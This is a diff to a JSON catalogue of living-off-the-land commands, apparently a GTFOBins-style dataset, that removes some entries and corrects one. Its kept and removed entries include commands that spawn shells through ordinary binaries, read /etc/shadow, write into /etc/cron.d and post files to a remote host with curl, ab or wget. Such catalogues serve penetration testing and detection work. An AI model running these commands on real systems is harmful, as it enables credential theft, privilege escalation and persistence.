@@ -19,8 +19,8 @@
       "sudo",
       "suid"
     ],
-    "total_commands": 696,
-    "total_binaries": 397
+    "total_commands": 676,
+    "total_binaries": 389
   },
   "commands": [
     {
@@ -37,11 +37,6 @@
       "command": "aa-exec /bin/sh",
       "binary": "aa-exec",
       "category": "shell"
-    },
-    {
-      "command": "ab -v2 http://10.0.0.1/etc/shadow",
-      "binary": "ab",
-      "category": "download"
     },
     {
       "command": "ab -p /etc/shadow http://10.0.0.1/",
@@ -132,11 +127,6 @@
       "command": "arj a /etc/cron.d/update /etc/shadow\narj p /etc/cron.d/update",
       "binary": "arj",
       "category": "file-read"
-    },
-    {
-      "command": "echo c2VydmljZS1jb25maWc= >output-file\narj a x output-file\narj e x /tmp/outdir/",
-      "binary": "arj",
-      "category": "file-write"
     },
     {
       "command": "arp -v -f /etc/shadow",
@@ -364,11 +354,6 @@
       "category": "shell"
     },
     {
-      "command": "cancel -h 10.0.0.1:4444 -u c2VydmljZS1jb25maWc=",
-      "binary": "cancel",
-      "category": "upload"
-    },
-    {
       "command": "capsh --",
       "binary": "capsh",
       "category": "shell"
@@ -534,11 +519,6 @@
       "category": "command"
     },
     {
-      "command": "crontab -e",
-      "binary": "crontab",
-      "category": "command"
-    },
-    {
       "command": "csh -c 'echo c2VydmljZS1jb25maWc= >/etc/cron.d/update'",
       "binary": "csh",
       "category": "file-write"
@@ -552,11 +532,6 @@
       "command": "csplit /etc/shadow 1\ncat xx01",
       "binary": "csplit",
       "category": "file-read"
-    },
-    {
-      "command": "echo c2VydmljZS1jb25maWc= >/tmp/tempfile\ncsplit -z -b %doutput-file' /tmp/tempfile 1",
-      "binary": "csplit",
-      "category": "file-write"
     },
     {
       "command": "csvtool trim t /etc/shadow",
@@ -600,11 +575,6 @@
     },
     {
       "command": "curl -X POST --data-binary @/etc/shadow http://10.0.0.1",
-      "binary": "curl",
-      "category": "upload"
-    },
-    {
-      "command": "curl -X POST --data-binary c2VydmljZS1jb25maWc= http://10.0.0.1",
       "binary": "curl",
       "category": "upload"
     },
@@ -939,16 +909,6 @@
       "category": "shell"
     },
     {
-      "command": "finger x@10.0.0.1",
-      "binary": "finger",
-      "category": "download"
-    },
-    {
-      "command": "finger c2VydmljZS1jb25maWc=@10.0.0.1",
-      "binary": "finger",
-      "category": "upload"
-    },
-    {
       "command": "firejail /bin/sh",
       "binary": "firejail",
       "category": "shell"
@@ -987,11 +947,6 @@
       "command": "fping -f /etc/shadow",
       "binary": "fping",
       "category": "file-read"
-    },
-    {
-      "command": "ftp -a 10.0.0.1\nget /etc/shadow output-file",
-      "binary": "ftp",
-      "category": "download"
     },
     {
       "command": "ftp\n!/bin/sh",
@@ -1412,11 +1367,6 @@
       "command": "latex '\\documentclass{article}\\usepackage{verbatim}\\begin{document}\\verbatiminput{/etc/shadow}\\end{document}'\nstrings texput.dvi",
       "binary": "latex",
       "category": "file-read"
-    },
-    {
-      "command": "latex '\\documentclass{article}\\newwrite\\tempfile\\begin{document}\\immediate\\openout\\tempfile=output-file.tex\\immediate\\write\\tempfile{c2VydmljZS1jb25maWc=}\\immediate\\closeout\\tempfile\\end{document}'",
-      "binary": "latex",
-      "category": "file-write"
     },
     {
       "command": "latex --shell-escape '\\immediate\\write18{/bin/sh}'",
@@ -2039,7 +1989,7 @@
       "category": "command"
     },
     {
-      "command": "rpm opkg install x_1.0_all.deb",
+      "command": "opkg install x_1.0_all.deb",
       "binary": "opkg",
       "category": "shell"
     },
@@ -2067,11 +2017,6 @@
       "command": "pdflatex '\\documentclass{article}\\usepackage{verbatim}\\begin{document}\\verbatiminput{/etc/shadow}\\end{document}'\npdftotext texput.pdf -",
       "binary": "pdflatex",
       "category": "file-read"
-    },
-    {
-      "command": "pdflatex '\\documentclass{article}\\newwrite\\tempfile\\begin{document}\\immediate\\openout\\tempfile=output-file.tex\\immediate\\write\\tempfile{c2VydmljZS1jb25maWc=}\\immediate\\closeout\\tempfile\\end{document}'",
-      "binary": "pdflatex",
-      "category": "file-write"
     },
     {
       "command": "pdflatex --shell-escape '\\documentclass{article}\\begin{document}\\immediate\\write18{/bin/sh}\\end{document}'",
@@ -2379,11 +2324,6 @@
       "category": "file-read"
     },
     {
-      "command": "redis-cli -h 127.0.0.1\nconfig set dir /tmp/outdir/\nconfig set dbfilename output-file\nset x \"c2VydmljZS1jb25maWc=\"\nsave",
-      "binary": "redis",
-      "category": "file-write"
-    },
-    {
       "command": "RESTIC_PASSWORD_COMMAND='/usr/local/bin/service-check' restic backup",
       "binary": "restic",
       "category": "command"
@@ -2532,11 +2472,6 @@
       "command": "rustdoc /etc/shadow",
       "binary": "rustdoc",
       "category": "file-read"
-    },
-    {
-      "command": "echo '//! c2VydmljZS1jb25maWc=' >/tmp/tempfile\nrustdoc /tmp/tempfile -o /tmp/outdir/",
-      "binary": "rustdoc",
-      "category": "file-write"
     },
     {
       "command": "rustfmt /etc/shadow",
@@ -2842,11 +2777,6 @@
       "command": "ssh-agent /bin/sh",
       "binary": "ssh-agent",
       "category": "shell"
-    },
-    {
-      "command": "ssh-copy-id -f -i /etc/shadow.pub user@10.0.0.1",
-      "binary": "ssh-copy-id",
-      "category": "file-read"
     },
     {
       "command": "ssh-copy-id -f -i /etc/shadow.pub -t /etc/cron.d/update user@host",
@@ -3159,11 +3089,6 @@
       "category": "file-read"
     },
     {
-      "command": "tsc /etc/shadow.ts",
-      "binary": "tsc",
-      "category": "file-read"
-    },
-    {
       "command": "tsc /etc/shadow.ts --outFile /etc/cron.d/update",
       "binary": "tsc",
       "category": "file-write"
@@ -3259,16 +3184,6 @@
       "category": "command"
     },
     {
-      "command": "echo c2VydmljZS1jb25maWc= >/tmp/tempfile\n\ncat >/tmp/tempfile.xml <<EOF\n<volume type='file'>\n  <name>y</name>\n  <key>/tmp/outdir/output-file</key>\n  <source>\n  </source>\n  <capacity unit='bytes'>5</capacity>\n  <allocation unit='bytes'>4096</allocation>\n  <physical unit='bytes'>5</physical>\n  <target>\n    <path>/tmp/outdir/output-file</path>\n    <format type='raw'/>\n    <permissions>\n      <mode>0600</mode>\n      <owner>0</owner>\n      <group>0</group>\n    </permissions>\n  </target>\n</volume>\nEOF\n\nvirsh -c qemu:///system pool-create-as x dir --target /tmp/outdir/\nvirsh -c qemu:///system vol-create --pool x --file /tmp/tempfile.xml\nvirsh -c qemu:///system vol-upload --pool x /tmp/outdir/output-file /tmp/tempfile\nvirsh -c qemu:///system pool-destroy x",
-      "binary": "virsh",
-      "category": "file-write"
-    },
-    {
-      "command": "virsh -c qemu:///system pool-create-as x dir --target /tmp/dir/\nvirsh -c qemu:///system vol-download --pool x input-file output-file\nvirsh -c qemu:///system pool-destroy x",
-      "binary": "virsh",
-      "category": "file-write"
-    },
-    {
       "command": "w3m -dump /etc/shadow",
       "binary": "w3m",
       "category": "file-read"
@@ -3324,24 +3239,9 @@
       "category": "upload"
     },
     {
-      "command": "wget --post-data=c2VydmljZS1jb25maWc= http://10.0.0.1",
-      "binary": "wget",
-      "category": "upload"
-    },
-    {
       "command": "whiptail --textbox --scrolltext /etc/shadow 0 0",
       "binary": "whiptail",
       "category": "file-read"
-    },
-    {
-      "command": "whois -h 10.0.0.1 -p 4444 x",
-      "binary": "whois",
-      "category": "download"
-    },
-    {
-      "command": "whois -h 10.0.0.1 -p 4444 c2VydmljZS1jb25maWc=",
-      "binary": "whois",
-      "category": "upload"
     },
     {
       "command": "wireshark -c 1 -i lo -k -f 'udp port 4444' &\necho c2VydmljZS1jb25maWc= | nc -u 127.127.127.127 4444",
